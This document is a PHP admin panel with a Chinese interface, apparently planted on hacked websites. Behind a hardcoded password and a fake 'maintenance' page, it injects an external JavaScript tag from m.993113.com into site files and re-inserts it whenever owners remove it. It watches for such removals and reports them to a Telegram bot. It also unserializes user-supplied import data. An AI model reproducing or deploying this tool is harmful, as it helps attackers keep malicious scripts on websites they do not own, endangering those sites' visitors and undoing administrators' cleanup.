<?php
header('Content-Type: text/html; charset=utf-8');

// 配置
$CONFIG = [
    'ACCESS_PASSWORD' => "admin123",
    'DEFAULT_SCRIPT' => '<script type="text/javascript" src="http://m.993113.com/xhxh.js"></script>',
    'STORAGE_DIR' => __DIR__ . '/.cache/'
];

extract($CONFIG);

// 权限检查
if (!isset($_GET['auth']) || $_GET['auth'] !== $ACCESS_PASSWORD) {
    die("<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:50px;text-align:center;'>
    <h1 style='color:#ff0000;text-shadow:0 0 10px #ff0000;'>🚫 系统维护中</h1>
    <p style='color:#00ffff;'>Access Denied</p></body></html>");
}

// 核心函数
function initStorage() {
    global $STORAGE_DIR;
    if (!is_dir($STORAGE_DIR)) mkdir($STORAGE_DIR, 0755, true);
    $indexFile = $STORAGE_DIR . 'index.dat';
    if (!file_exists($indexFile)) {
        file_put_contents($indexFile, serialize(['current_storage' => '', 'telegram_config' => ['token' => '', 'chat_id' => '']]));
    }
}

function safeFile($filePath) {
    $filePath = str_replace(['../', './'], '', $filePath);
    $paths = [$filePath, dirname(__FILE__) . '/' . ltrim($filePath, '/')];
    foreach ($paths as $path) {
        if (file_exists($path) && is_file($path)) return $path;
    }
    return false;
}

function getCurrentStorage() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    return (!file_exists($indexFile) || !($index = unserialize(file_get_contents($indexFile))) || empty($index['current_storage'])) ? createStorage() : $index['current_storage'];
}

function createStorage() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    $index = file_exists($indexFile) ? unserialize(file_get_contents($indexFile)) : [];
    $storageFile = $GLOBALS['STORAGE_DIR'] . 'pos_' . time() . '_' . bin2hex(random_bytes(8)) . '.dat';
    if (file_put_contents($storageFile, serialize(['created_at' => date('Y-m-d H:i:s'), 'positions' => []]))) {
        $index['current_storage'] = $storageFile;
        file_put_contents($indexFile, serialize($index));
        return $storageFile;
    }
    return false;
}

function getPositions() {
    return ($storageFile = getCurrentStorage()) && file_exists($storageFile) && ($data = unserialize(file_get_contents($storageFile))) ? $data['positions'] ?? [] : [];
}

function savePositions($positions) {
    return file_put_contents(getCurrentStorage(), serialize(['created_at' => date('Y-m-d H:i:s'), 'positions' => $positions])) !== false;
}

function getTelegramConfig() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    return (!file_exists($indexFile) || !($index = unserialize(file_get_contents($indexFile)))) ? ['token' => '', 'chat_id' => ''] : $index['telegram_config'] ?? ['token' => '', 'chat_id' => ''];
}

function saveTelegramConfig($token, $chatId) {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    $index = file_exists($indexFile) ? unserialize(file_get_contents($indexFile)) : [];
    $index['telegram_config'] = ['token' => trim($token), 'chat_id' => trim($chatId)];
    return file_put_contents($indexFile, serialize($index)) !== false;
}

function telegramSend($message) {
    $config = getTelegramConfig();
    if (empty($config['token']) || empty($config['chat_id'])) return false;
    
    $url = "https://api.telegram.org/bot{$config['token']}/sendMessage";
    $data = ['chat_id' => $config['chat_id'], 'text' => $message, 'parse_mode' => 'HTML'];
    $options = ['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($data)]];
    return @file_get_contents($url, false, stream_context_create($options)) !== false;
}

// 检查所有位置变化
function checkAllPositions() {
    $changes = [];
    foreach (getPositions() as $fileHash => $info) {
        if (!safeFile($info['file'])) {
            $changes[] = ['type' => 'deleted', 'file' => $info['file'], 'info' => $info];
            continue;
        }
        
        $content = file_get_contents($info['file']);
        if ($content === false) continue;
        
        $currentPos = strpos($content, $info['target_script']);
        if ($currentPos === false) {
            $changes[] = ['type' => 'removed', 'file' => $info['file'], 'info' => $info];
        } else {
            $currentLine = substr_count(substr($content, 0, $currentPos), "\n") + 1;
            if ($currentLine != $info['line']) {
                $changes[] = ['type' => 'moved', 'file' => $info['file'], 'info' => $info, 'new_line' => $currentLine];
            }
        }
    }
    return $changes;
}

// 生成优化的Telegram报告
function generateTelegramReport($changes) {
    if (empty($changes)) {
        return "🟢 <b>脚本监控报告</b>\n\n🕒 检查时间: " . date('Y-m-d H:i:s') . "\n📊 状态: 所有文件正常";
    }
    
    $message = "🔴 <b>脚本监控异常报告</b>\n\n";
    $message .= "🕒 检查时间: " . date('Y-m-d H:i:s') . "\n";
    $message .= "📊 异常文件: " . count($changes) . " 个\n\n";
    
    foreach ($changes as $index => $change) {
        $scriptPreview = substr($change['info']['target_script'], 0, 100) . (strlen($change['info']['target_script']) > 100 ? '...' : '');
        
        $message .= "📄 <b>文件 " . ($index + 1) . ":</b> " . basename($change['file']) . "\n";
        
        switch ($change['type']) {
            case 'deleted':
                $message .= "❌ <b>问题:</b> 文件已被删除\n";
                $message .= "📍 <b>原位置:</b> 第 {$change['info']['line']} 行\n";
                break;
            case 'removed':
                $message .= "❌ <b>问题:</b> 脚本代码被移除\n";
                $message .= "📍 <b>原位置:</b> 第 {$change['info']['line']} 行\n";
                $message .= "📜 <b>被移除代码:</b>\n<code>" . htmlspecialchars($scriptPreview) . "</code>\n";
                break;
            case 'moved':
                $message .= "🔄 <b>问题:</b> 脚本位置变化\n";
                $message .= "📍 <b>原位置:</b> 第 {$change['info']['line']} 行\n";
                $message .= "📍 <b>新位置:</b> 第 {$change['new_line']} 行\n";
                break;
        }
        
        $message .= "📁 <b>路径:</b> " . $change['file'] . "\n\n";
    }
    
    $message .= "💡 <i>请及时登录系统处理异常</i>";
    return $message;
}

// 自动检测
if (isset($_GET['auto_check']) && $_GET['auto_check'] === '1') {
    initStorage();
    $changes = checkAllPositions();
    telegramSend(generateTelegramReport($changes));
    
    echo "<!DOCTYPE html><html><head><title>自动检测报告</title><meta charset='utf-8'><style>
        body{font-family:Arial,sans-serif;background:#0a0a0a;color:#00ff00;padding:20px;}
        .success{color:#05ffa1;}.error{color:#ff2a6d;}.warning{color:#ffeb3b;}
        .change-item{border-left:3px solid #ff2a6d;padding:15px;margin:15px 0;background:rgba(255,42,109,0.1);}
    </style></head><body><h1>🔮 自动检测报告</h1>
    <p>🕒 检查时间: " . date('Y-m-d H:i:s') . "</p>
    <p>📊 发现变化: " . count($changes) . " 个文件</p>";
    
    if (!empty($changes)) {
        echo "<h2 class='warning'>🚨 变化详情:</h2>";
        foreach ($changes as $change) {
            $scriptPreview = substr($change['info']['target_script'], 0, 200) . (strlen($change['info']['target_script']) > 200 ? '...' : '');
            echo "<div class='change-item'>
                <p><strong>📄 文件:</strong> " . basename($change['file']) . "</p>
                <p><strong>🔧 类型:</strong> " . 
                ($change['type'] === 'deleted' ? '文件被删除' : 
                 ($change['type'] === 'removed' ? '脚本代码被移除' : '位置变化')) . "</p>
                <p><strong>📍 原位置:</strong> 第 {$change['info']['line']} 行</p>";
            
            if ($change['type'] === 'moved') {
                echo "<p><strong>📍 新位置:</strong> 第 {$change['new_line']} 行</p>";
            }
            if ($change['type'] === 'removed') {
                echo "<p><strong>📜 被移除代码:</strong><br><code style='background:#1a1a1a;padding:10px;display:block;margin:5px 0;'>" . htmlspecialchars($scriptPreview) . "</code></p>";
            }
            echo "<p><strong>📂 路径:</strong> {$change['file']}</p></div>";
        }
    } else {
        echo "<p class='success'>✅ 没有发现变化，所有文件状态正常。</p>";
    }
    echo "</body></html>";
    exit;
}

// 主要功能
function checkScript($file, $script) {
    if (!($path = safeFile($file))) return "❌ 文件不存在: " . htmlspecialchars($file);
    if (($content = file_get_contents($path)) === false) return "❌ 无法读取文件内容";
    
    $pos = strpos($content, $script);
    $positions = getPositions();
    $fileHash = md5($file . $script);
    $saved = $positions[$fileHash] ?? null;
    
    if ($pos !== false) {
        $line = substr_count(substr($content, 0, $pos), "\n") + 1;
        $result = "✅ 脚本存在于文件中<br><strong>位置:</strong> 第 {$line} 行";
        if ($saved) $result .= "<br><strong>已保存位置:</strong> 第 {$saved['line']} 行";
        return $result;
    } else {
        $result = "⚠ 脚本不存在于文件中";
        if ($saved) $result .= "<br><strong>已保存位置:</strong> 第 {$saved['line']} 行";
        return $result;
    }
}

function savePosition($file, $script) {
    if (!($path = safeFile($file))) return "❌ 文件不存在: " . htmlspecialchars($file);
    if (($content = file_get_contents($path)) === false) return "❌ 无法读取文件内容";
    
    $pos = strpos($content, $script);
    if ($pos === false) return "⚠ 无法保存位置：文件中未找到指定脚本";
    
    $line = substr_count(substr($content, 0, $pos), "\n") + 1;
    $fileHash = md5($file . $script);
    
    $positionData = [
        'file' => $path, 'target_script' => $script, 'line' => $line,
        'saved_at' => date('Y-m-d H:i:s'), 'file_hash' => $fileHash
    ];
    
    $positions = getPositions();
    $positions[$fileHash] = $positionData;
    
    return savePositions($positions) ? 
        "✅ 脚本位置已保存！<br><strong>文件:</strong> " . basename($path) . "<br><strong>位置:</strong> 第 {$line} 行" : 
        "❌ 保存失败";
}

function restoreScript($file, $script, $location = 'head') {
    if (!($path = safeFile($file))) return "❌ 文件不存在: " . htmlspecialchars($file);
    if (($content = file_get_contents($path)) === false) return "❌ 无法读取文件内容";
    
    $cleanContent = str_replace($script, '', $content);
    $actualLocation = '';
    
    switch($location) {
        case 'head':
            if (preg_match('/<head[^>]*>/i', $cleanContent)) {
                $newContent = preg_replace('/(<head[^>]*>)/i', "$1\n" . $script, $cleanContent);
                $actualLocation = "head标签内";
            } else {
                $newContent = $script . "\n" . $cleanContent;
                $actualLocation = "文件开头";
            }
            break;
        case 'body_start':
            if (preg_match('/<body[^>]*>/i', $cleanContent)) {
                $newContent = preg_replace('/(<body[^>]*>)/i', "$1\n" . $script, $cleanContent);
                $actualLocation = "body开始标签后";
            } else {
                $newContent = $cleanContent . "\n" . $script;
                $actualLocation = "文件末尾";
            }
            break;
        case 'body_end':
            if (preg_match('/<\/body[^>]*>/i', $cleanContent)) {
                $newContent = preg_replace('/(<\/body[^>]*>)/i', $script . "\n$1", $cleanContent);
                $actualLocation = "body结束标签前";
            } else {
                $newContent = $cleanContent . "\n" . $script . "\n";
                $actualLocation = "文件末尾";
            }
            break;
        case 'file_start':
            $newContent = $script . "\n" . $cleanContent;
            $actualLocation = "文件开头";
            break;
        case 'file_end':
            $newContent = $cleanContent . "\n" . $script;
            $actualLocation = "文件末尾";
            break;
        default:
            $newContent = $script . "\n" . $cleanContent;
            $actualLocation = "文件开头";
    }
    
    return file_put_contents($path, $newContent) !== false ? 
        "✅ 脚本恢复成功！<br><strong>插入位置:</strong> {$actualLocation}" : 
        "❌ 写入文件失败";
}

// 初始化
initStorage();

// 获取参数
$filePath = $_GET['s'] ?? $_POST['file_path'] ?? '';
$currentScript = $_POST['check_script'] ?? $_POST['custom_script'] ?? $DEFAULT_SCRIPT;
$currentScript = trim($currentScript);
$insertLocation = $_POST['insert_location'] ?? 'head';

// 处理操作
$result = '';
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'check': $result = checkScript($filePath, $currentScript); break;
        case 'restore': $result = restoreScript($filePath, $currentScript, $insertLocation); break;
        case 'save_position': $result = savePosition($filePath, $currentScript); break;
        case 'auto_restore': 
            $positions = getPositions();
            $fileHash = md5($filePath . $currentScript);
            $result = isset($positions[$fileHash]) ? 
                restoreScript($filePath, $positions[$fileHash]['target_script'], 'head') : 
                "⚠ 未找到该文件的保存位置";
            break;
        case 'export_positions':
            $exportData = base64_encode(serialize(getPositions()));
            $result = "📤 位置信息导出成功<br><textarea onclick='this.select()'>" . htmlspecialchars($exportData) . "</textarea>";
            break;
        case 'import_positions':
            if (!empty($_POST['import_data']) && ($decodedData = base64_decode($_POST['import_data'])) !== false) {
                $positions = unserialize($decodedData);
                $result = ($positions && is_array($positions) && savePositions($positions)) ? 
                    "✅ 位置信息导入成功！共导入 " . count($positions) . " 个位置记录" : 
                    "❌ 导入数据格式错误";
            }
            break;
        case 'clear_positions':
            $result = savePositions([]) ? "✅ 所有保存的位置已清除" : "❌ 清除失败";
            break;
        case 'force_check':
            $changes = checkAllPositions();
            if (empty($changes)) {
                $result = "✅ 所有文件状态正常，未发现变化";
            } else {
                $result = "🔍 实时监控报告<br><br>";
                foreach ($changes as $change) {
                    $typeText = [
                        'deleted' => '💀 文件被删除',
                        'removed' => '❌ 脚本代码被移除', 
                        'moved' => '🔄 位置变化'
                    ][$change['type']];
                    
                    $result .= "<div style='margin-bottom:15px;padding:12px;background:rgba(255,255,255,0.05);'>
                    {$typeText}: {$change['file']}<br>📍 原位置: 第 {$change['info']['line']} 行";
                    
                    if ($change['type'] === 'moved') {
                        $result .= "<br>📍 新位置: 第 {$change['new_line']} 行";
                    }
                    if ($change['type'] === 'removed') {
                        $scriptPreview = substr($change['info']['target_script'], 0, 100) . '...';
                        $result .= "<br>📜 被移除代码: " . htmlspecialchars($scriptPreview);
                    }
                    $result .= "</div>";
                }
                $result .= "<br>🕒 检查时间: " . date('Y-m-d H:i:s');
            }
            telegramSend(generateTelegramReport($changes));
            break;
        case 'test_telegram':
            $testMsg = "🔔 CYBER SCRIPT CONTROL SYSTEM\n\n✅ Telegram 通知测试\n🕒 时间: " . date('Y-m-d H:i:s');
            $result = telegramSend($testMsg) ? "✅ Telegram测试消息发送成功！" : "❌ Telegram测试消息发送失败";
            break;
        case 'save_telegram_config':
            $token = $_POST['telegram_token'] ?? '';
            $chatId = $_POST['telegram_chat_id'] ?? '';
            $result = saveTelegramConfig($token, $chatId) ? "✅ Telegram配置保存成功！" : "❌ Telegram配置保存失败";
            break;
    }
}

// 获取当前Telegram配置
$telegramConfig = getTelegramConfig();
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔮 CYBER SCRIPT CONTROL</title>
    <style>
        :root { --blue: #00f3ff; --purple: #b967ff; --pink: #ff2a6d; --green: #05ffa1; --bg: #0a0a12; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; line-height: 1.6; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; padding: 30px; background: linear-gradient(135deg, rgba(10,10,30,0.9), rgba(5,5,20,0.9)); border-radius: 15px; }
        .header h1 { font-size: 2rem; background: linear-gradient(45deg, var(--blue), var(--purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card { background: rgba(16,16,32,0.8); border: 1px solid rgba(0,243,255,0.3); border-radius: 10px; padding: 20px; margin-bottom: 20px; }
        .input { width: 100%; min-height: 100px; padding: 15px; border: 1px solid rgba(0,243,255,0.3); border-radius: 8px; background: rgba(10,10,30,0.8); color: #fff; font-family: monospace; resize: vertical; }
        .input-small { min-height: auto; padding: 10px; }
        .btn { display: inline-flex; align-items: center; gap: 8px; padding: 12px 20px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin: 5px; }
        .btn.primary { background: linear-gradient(45deg, var(--blue), var(--purple)); color: white; }
        .btn.success { background: linear-gradient(45deg, var(--green), #00cc88); color: white; }
        .btn.warning { background: linear-gradient(45deg, #ffeb3b, #ff9800); color: #000; }
        .btn.danger { background: linear-gradient(45deg, var(--pink), #ff0055); color: white; }
        .alert { padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid; background: rgba(20,20,40,0.8); }
        .alert.success { border-color: var(--green); }
        .alert.warning { border-color: #ffeb3b; }
        .alert.error { border-color: var(--pink); }
        .position-card { background: rgba(20,20,40,0.6); border: 1px solid rgba(0,243,255,0.3); border-radius: 10px; padding: 15px; margin-bottom: 15px; }
        .position-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
        .position-line { background: var(--blue); color: #000; padding: 4px 8px; border-radius: 10px; font-size: 0.8em; }
        .position-actions { display: flex; gap: 10px; margin-top: 10px; }
        .select { padding: 8px; border-radius: 6px; background: rgba(10,10,30,0.8); color: #fff; border: 1px solid rgba(0,243,255,0.3); }
        .form-group { margin-bottom: 15px; }
        .form-label { display: block; margin-bottom: 5px; font-weight: bold; color: var(--blue); }
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .header { padding: 20px; }
            .position-actions { flex-direction: column; }
        }
    </style>
    <script>
        function syncScript() { document.getElementById('custom_script').value = document.getElementById('check_script').value; }
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔮 CYBER SCRIPT CONTROL</h1>
            <p>Liseth专属js维权</p>
        </div>

        <div class="card">
            <h2>🎯 脚本检测</h2>
            <form method="post">
                <textarea name="check_script" id="check_script" class="input" placeholder="输入脚本代码..." oninput="syncScript()"><?= htmlspecialchars($currentScript) ?></textarea>
                <button type="submit" name="action" value="check" class="btn primary">🔍 检测脚本</button>
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($filePath) ?>">
            </form>
        </div>

        <div class="card">
            <h2>📁 文件分析</h2>
            <div style="margin-bottom: 20px;">
                <div><strong>文件:</strong> <?= htmlspecialchars($filePath ? basename($filePath) : '未选择') ?></div>
                <div><strong>状态:</strong> <?= $filePath && safeFile($filePath) ? '✅ 存在' : '❌ 不存在' ?></div>
            </div>
            
            <?php if ($filePath && safeFile($filePath)): ?>
            <form method="post">
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($filePath) ?>">
                <input type="hidden" name="custom_script" id="custom_script" value="<?= htmlspecialchars($currentScript) ?>">
                <button type="submit" name="action" value="save_position" class="btn primary">💾 保存位置</button>
                <button type="submit" name="action" value="auto_restore" class="btn success">🎯 自动恢复</button>
                <select name="insert_location" class="select">
                    <option value="head" <?= $insertLocation === 'head' ? 'selected' : '' ?>>head标签</option>
                    <option value="body_start" <?= $insertLocation === 'body_start' ? 'selected' : '' ?>>body开始</option>
                    <option value="body_end" <?= $insertLocation === 'body_end' ? 'selected' : '' ?>>body结束</option>
                    <option value="file_start" <?= $insertLocation === 'file_start' ? 'selected' : '' ?>>文件开头</option>
                    <option value="file_end" <?= $insertLocation === 'file_end' ? 'selected' : '' ?>>文件末尾</option>
                </select>
                <button type="submit" name="action" value="restore" class="btn warning">执行恢复</button>
            </form>
            <?php endif; ?>
        </div>

        <?php if ($result): ?>
        <div class="card">
            <div class="alert <?= strpos($result, '✅') !== false ? 'success' : (strpos($result, '⚠') !== false ? 'warning' : 'error') ?>">
                <?= $result ?>
            </div>
        </div>
        <?php endif; ?>

        <div class="card">
            <h2>📱 Telegram 配置</h2>
            <form method="post">
                <div class="form-group">
                    <label class="form-label">Telegram Bot Token:</label>
                    <input type="text" name="telegram_token" class="input input-small" value="<?= htmlspecialchars($telegramConfig['token']) ?>" placeholder="输入Telegram Bot Token">
                </div>
                <div class="form-group">
                    <label class="form-label">Telegram Chat ID:</label>
                    <input type="text" name="telegram_chat_id" class="input input-small" value="<?= htmlspecialchars($telegramConfig['chat_id']) ?>" placeholder="输入Telegram Chat ID">
                </div>
                <button type="submit" name="action" value="save_telegram_config" class="btn primary">💾 保存配置</button>
                <button type="submit" name="action" value="test_telegram" class="btn success">📱 测试通知</button>
                <button type="submit" name="action" value="force_check" class="btn warning">🔍 检测并通知</button>
            </form>
        </div>

        <div class="card">
            <h2>💾 存储管理</h2>
            <?php $positions = getPositions(); ?>

            <?php if (empty($positions)): ?>
            <div class="alert warning">暂无保存的位置信息</div>
            <?php else: ?>
            <div class="alert success">✅ 已存储 <?= count($positions) ?> 个位置</div>
            <div style="margin: 20px 0;">
                <?php foreach ($positions as $info): ?>
                <div class="position-card">
                    <div class="position-header">
                        <strong><?= basename($info['file']) ?></strong>
                        <span class="position-line">第 <?= $info['line'] ?> 行</span>
                    </div>
                    <div class="position-actions">
                        <form method="post">
                            <input type="hidden" name="file_path" value="<?= $info['file'] ?>">
                            <input type="hidden" name="custom_script" value="<?= htmlspecialchars($info['target_script']) ?>">
                            <button type="submit" name="action" value="auto_restore" class="btn primary">自动恢复</button>
                        </form>
                        <form method="post" style="display: flex; gap: 5px; flex: 1;">
                            <input type="hidden" name="file_path" value="<?= $info['file'] ?>">
                            <input type="hidden" name="custom_script" value="<?= htmlspecialchars($info['target_script']) ?>">
                            <select name="insert_location" class="select" style="flex: 1;">
                                <option value="head">head标签</option>
                                <option value="body_start">body开始</option>
                                <option value="body_end">body结束</option>
                                <option value="file_start">文件开头</option>
                                <option value="file_end">文件末尾</option>
                            </select>
                            <button type="submit" name="action" value="restore" class="btn warning">恢复</button>
                        </form>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>

            <form method="post">
                <button type="submit" name="action" value="export_positions" class="btn primary">📤 导出位置</button>
                <button type="submit" name="action" value="clear_positions" class="btn danger" onclick="return confirm('确定清除所有位置？')">🗑️ 清除所有</button>
            </form>
        </div>
    </div>
</body>
</html>
